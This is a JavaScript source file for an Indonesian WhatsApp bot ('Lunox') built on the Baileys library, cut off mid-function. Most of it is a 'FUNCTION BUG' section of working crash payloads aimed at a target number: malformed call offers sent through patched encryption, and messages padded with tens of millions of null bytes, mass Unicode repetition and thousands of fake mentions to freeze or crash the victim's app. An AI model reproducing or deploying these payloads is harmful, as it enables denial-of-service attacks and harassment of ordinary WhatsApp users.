//NO HAPUS CREDIT YA4TIM
//CREDITS : JUSTIN
//CREDIT2 : KYUURZY
//TIKTOK : @justinandiar
//RENAME SEPERLU & SEPENTING NYA AJA BIAR GA ERORR, ERORR TANGGUNG SENDIRI!


const config = require('./settings/config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const fetch = require("node-fetch")
const moment = require("moment-timezone");
const path = require("path")
const os = require('os');
const crypto = require("crypto");
const speed = require('performance-now')
const { spawn, exec, execSync } = require('child_process');
const { default: baileys, getContentType, generateWAMessageFromContent, downloadContentFromMessage, proto } = require("@whiskeysockets/baileys");
module.exports = async function justinoffc(client, m, chatUpdate, store) {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
        );
        
        const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" ||
              client.user.id : m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const botNumber = await client.decodeJid(client.user.id);
        const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, './Lunox-Prime/lib/database/owner.json'), 'utf8'))
        const isOwner = [botNumber, ...kontributor].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
        const isBot = botNumber.includes(senderNumber)
        
        const isCmd = body.startsWith(prefix) ? true : false
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        
        const { smsg, fetchJson, sleep, formatSize, runtime } = require('./Lunox-Prime/lib/myfunction');     
        const cihuy = fs.readFileSync('./Lunox-Prime/lib/media/w-shennmine.jpg')
        const { fquoted } = require('./Lunox-Prime/lib/fquoted')

        // group
        const groupMetadata = m?.isGroup ? await client.groupMetadata(m.chat).catch(() => ({})) : {};
        const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
        const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                admin,
                full: p
            };
        }) || []: [];
        const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
        const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
        const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
        const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
        async function getLid(jid) {
            return client.getLidUser(jid)
        }
        
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   ▢ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ▢ Pesan: ${m.body || m.mtype} \n` +
                    `   ▢ Pengirim: ${pushname} \n` +
                    `   ▢ JID: ${senderNumber} \n`
                )
            );
            console.log();
        }
        
       
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: "arraybuffer" })
    return Buffer.from(res.data, "binary")
}

        const reaction = async (jidss, emoji) => {
            client.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
        async function reply(text) {
            client.sendMessage(m.chat, {
                text: "\n" + text + "\n",
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: config.settings.title,
                        body: config.settings.description,
                        thumbnailUrl: config.thumbUrl,
                        sourceUrl: config.socialMedia.Telegram,
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: fquoted.channel })
        }
     
// Fungsi tambahan untuk stream to buffer
async function streamToBuffer(stream) {
  const chunks = [];
  for await (const chunk of stream) {
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}

        
const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: 'ownername',
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: 'TikTok PinzyOfficial'
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363424874566521@newsletter',
newsletterName: 'YT LunoxOfficial-ID',
jpegThumbnail: "",
caption: 'YouTube LunoxOfficial-ID',
inviteExpiration: Date.now() + 1814400000
}
}}   
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `Pinzy - Lunox`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285183387097:+62 851-8338-7097\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

if (global.owneroff && !isCmd) {
  if (!isGroup && !isOwner) {
    const teks = `*Hai Kak* @${m.sender.split('@')[0]} Maaf *Tuanku Pinzy Sedang Offline*, Silahkan Tunggu Tuanku Kembali Online & Jangan Spam Chat`;
    return client.sendMessage(m.chat, {
      text: teks,
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          showAdAttribution: true,
          thumbnail: fs.readFileSync("./Lunox-Prime/pinzycrot.jpg"),
          renderLargerThumbnail: false,
          title: "｢ OWNER OFFLINE MODE ｣",
          mediaUrl: "https://wa.me/6285183387097",
          sourceUrl: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U",
          previewType: "PHOTO"
        }
      }
    }, { quoted: m });
  }
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

//FUNCTION BUG
async function LunoxCallCrash(target, isVideo = false) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
  
  try {
    const devices = (
      await client.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await client.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = client.createParticipantNodes?.bind(client);
    const originalEncodeWAMessage = client.encodeWAMessage?.bind(client);

    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = client.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await client.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await client.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: client.generateMessageTag(),
        from: client.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": client.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(client.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await client.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}

async function LunoxForceDelete(target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    const ZhTxRizzMsg = await generateWAMessageFromContent(
        target,
        { conversation: " " },
        { userJid: client.user.id }
    );

    await client.relayMessage(target, ZhTxRizzMsg.message, { messageId: ZhTxRizzMsg.key.id });
    await client.sendMessage(target, { delete: ZhTxRizzMsg.key });

     let devices = (
        await client.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await client.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let Raza = xnxx();
    let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let XMods = client.createParticipantNodes.bind(client);
    let Cyber = client.encodeWAMessage?.bind(client);

    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let memeg = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = client.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            memeg.map(async ({ recipientJid: jid, message: ZhTxRizzMsg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);
                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) ZhTxRizzMsg = dsmMessage;

                let bytes = Official(Cyber ? Cyber(ZhTxRizzMsg) : encodeWAMessage(ZhTxRizzMsg));

                return Raza.mutex(jid, async () => {
                    let { type, ciphertext } = await client.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [
                            {
                                tag: 'enc',
                                attrs: { v: '2', type, ...extraAttrs },
                                content: ciphertext
                            }
                        ]
                    };
                });
            })
        );

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let Exo = crypto.randomBytes(32);
    let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await client.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let lemiting = {
        tag: "call",
        attrs: {
            to: target,
            id: client.generateMessageTag(),
            from: client.user.id
        },
        content: [
            {
                tag: "offer",
                attrs: {
                    "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                    "call-creator": client.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    {
                        tag: "video",
                        attrs: {
                            orientation: "0",
                            screen_width: "1920",
                            screen_height: "1080",
                            device_orientation: "0",
                            enc: "vp8",
                            dec: "vp8"
                        }
                    },
                    { tag: "net", attrs: { medium: "3" } },
                    {
                        tag: "capability",
                        attrs: { ver: "1" },
                        content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                    },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity
                        ? [
                            {
                                tag: "device-identity",
                                attrs: {},
                                content: encodeSignedDeviceIdentity(
                                    client.authState.creds.account,
                                    true
                                )
                            }
                        ]
                        : []
                    )
                ]
            }
        ]
    };

    await client.sendNode(lemiting);
    console.log(`Lunox Attack To: ${target} By Pinzy`);
}

async function LunoxBlank(target) {
  await client.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "𝙇𝙪𝙣𝙤𝙭𝙋𝙧𝙞𝙢𝙚 𝘼𝙩𝙩𝙖𝙘𝙠 ☠️" + "؂ن؃؄𝘓𝘶𝘯𝘰𝘹ٽ؂ن؃".repeat(10000),
        publisher: "𝙇𝙪𝙣𝙤𝙭𝙋𝙧𝙞𝙢𝙚 𝘼𝙩𝙩𝙖𝙘𝙠 ☠️" + "؂ن؃؄𝘓𝘶𝘯𝘰𝘹ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "woi",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "maklo",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Pinzy"
                }
            }
        },
        packDescription: "𝙇𝙪𝙣𝙤𝙭 𝘼𝙩𝙩𝙖𝙘𝙠 ☠️" + "؂ن؃؄𝘓𝘶𝘯𝘰𝘹ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}

async function forcloselunoxwel(target) {
  await client.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: " ¿!LunoxPrime!¿ ",
            format: "EXTENSIONS_1"
          },
          contextInfo: {
            remoteJid: " ¡!LunoxAttack!¡ ",
            participant: "120363424874566521@s.whatsapp.net",
            mentionedJid: ["status@broadcast"],
            isForwarded: true,
            forwardingScore: 9999,
            parentGroupJid: "0@g.us",
            isQuestion: true,
            isSampled: true,
            parentGroupJid: "\u0000".repeat(100000),
            entryPointConversionDelaySeconds: 6767676767,
            businessMessageForwardInfo: null,
            quotedMessage: {
              ephemeralMessage: {
                message: {
                  paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: 7205
                  }
                }
              }
            }
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(100000),
            version: 1
          }
        }
      }
    }
  }, { participant: { jid: target } })
}

async function ProductionLunox(target) {
  const productMsg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        productMessage: {
          product: {
            productImage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQNVVr96P2W2N6c2cWRXcRus7roBnJsAsj_DdImpCHGGMkqCTkwvpAuB7rd8IzTMFsenSI8bwq5v7C4_gCAZVUNY_aO-do-JVWcmCR1E4A?ccb=9-4&oh=01_Q5Aa3AFfmMdvZTkuDpy0g_3HpiCYo-g7sxug_OZv__Pz3YX4eg&oe=694013D5&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "/9OqehnTXlXT3BjmOSACk/6PA2YDD/LPI1rxiGARzIA=",
              fileLength: "1332709",
              height: 9999,
              width: 9999,
              mediaKey: "MBrUCtMvEYCXNxw2TLsPyUfPrIOxCV5b3TprGyU7LiA=",
              fileEncSha256: "GrCugonhvozxlTdX0uf0wfKvYTnXzeFVLb6Fw8V5eNc=",
              directPath: "/o1/v/t24/f2/m231/AQNVVr96P2W2N6c2cWRXcRus7roBnJsAsj_DdImpCHGGMkqCTkwvpAuB7rd8IzTMFsenSI8bwq5v7C4_gCAZVUNY_aO-do-JVWcmCR1E4A?ccb=9-4&oh=01_Q5Aa3AFfmMdvZTkuDpy0g_3HpiCYo-g7sxug_OZv__Pz3YX4eg&oe=694013D5&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1763027544",
              jpegThumbnail: null,
              scanLengths: [4841, 5561, 3792, 10277],
              midQualityFileSha256: "HWw9tUG2Ua+mMyq4OIl9Qm5NU0+8Nb/Ro2Ir2jGjfYQ="
            },
            productId: "25083871484575184",
            title: "MAU BELI PRODUCTIONS SAYA TIDAK?",
            currencyCode: "IDR",
            priceAmount1000: "5310000000000",
            productImageCount: 1,
            salePriceAmount1000: "1000000000"
          },
        }
      }
    }
  }, {});
  
  await client.relayMessage(target, productMsg.message, {
    messageId: productMsg.key.id,
    participant: { jid: target },
  });
}

async function LunoxInvis(target) {
  await client.relayMessage(
    target,
    {
      albumMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
          remoteJid: " ¡!LunoxPrime!¡ ",
          parentGroupJid: "0@g.us",
          isQuestion: true,
          isSampled: true,
          parentGroupJid: "\u0000",
          entryPointConversionDelaySeconds: 6767676767,
          businessMessageForwardInfo: null,
          botMessageSharingInfo: {
            botEntryPointOrigin: {
              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
            },
            forwardScore: 999
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "@pinzy • #fvcker 🩸",
                    format: "EXTENSIONS_1",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1000000),
                    version: 1,
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function LunoxDelayX(target, ptcp = true) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "Assalamualaikum Bang!"
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            participant: target,
            isForwarded: true,
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => 1 + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
              ],
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    },
    {
    ephemeralExpiration: 0,
      forwardingScore: 9681,
      isForwarded: true,
      font: Math.floor(Math.random() * 500000),
      background: "#" + Math.floor(Math.random() * 17779012).toString(16).padStart(6, "500000")
    },
  );
  
  await client.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
      },
    }, ptcp ? 
    { 
      messageId: msg.key.id, 
      participant: { jid: target } 
    } : { messageId: msg.key.id }
  );
}

async function LunoxXdelay2(target, mention = true) {
  try {
    console.log(`⏳ The Lunox Attack ke ${target}`);
    
    const Secret = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            header: {
              title: "\u0000".repeat(50000000),
              hasMediaAttachment: false
            },
            body: {
              text: "⏳ Lunox Imcoming" + "\u0000".repeat(50000000)
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{"flow_cta":"${"\u0000".repeat(50000000)}"}`,
              version: 3                    
            },
            contextInfo: {
              forwardingScore: 999999,
              isForwarded: true,
              stanzaId: "\u0000".repeat(50000),
              participant: target,
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 2500 }, () => 
                  Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
                )
              ],
              quotedMessage: {
                liveLocationMessage: {
                  degreesLatitude: 23045678087,
                  degreesLongitude: 23045678087,
                  caption: "\u0000".repeat(50000000),
                  accuracyInMeters: 9999999999,
                  speedInMps: 9999999999
                }
              }
            }
          }
        }
      }
    }, { userJid: client.user.id });
    
    await client.relayMessage(target, Secret.message, {
      messageId: Secret.key.id,
      participant: { jid: target }
    });
    
    await new Promise(r => setTimeout(r, 5000));
    
    console.log(`✅ The Lunox Sukses Attack Sent To: ${target}`);
    
  } catch (err) {
    console.error(`❌ Error: ${err.message}`);
  }
}

async function DelayLunox(target) {
  await client.relayMessage(target, {
    botInvokeMessage: {
      message: {
        listResponseMessage: {
          title: " ? Lunox ¿ | t.me/Pinnxyz ",
          description: " collab with devorsels, Lunox, Pinzy ¡! ",
          listType: 1,
          singleSelectReply: {
            selectedRowId: "\"f*ck bastard\""
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            fromMe: false,
            remoteJid: " dnd ",
            participant: "ddd",
            urlTrackingMap: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`,
              type: 1,
            })),
            
          }
        }
      }
    }
  }, { participant: { jid: target }, userJid: null })
}

async function PinzyLunoxUI(target) {
console.log(chalk.red(`𝗟𝘂𝗻𝗼𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    let peler = await client.relayMessage(
      target,
      {
        extendedTextMessage: {
          text: "⸙ʟᴜɴᴏx нοω αяє γου?¿" + "ꦾ".repeat(50000),
          matchedText: "ꦽ".repeat(20000),
          description: "⸙ʟᴜɴᴏx нοω αяє γου?¿",
          title: "ꦽ".repeat(20000),
          previewType: "NONE",
          jpegThumbnail:
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
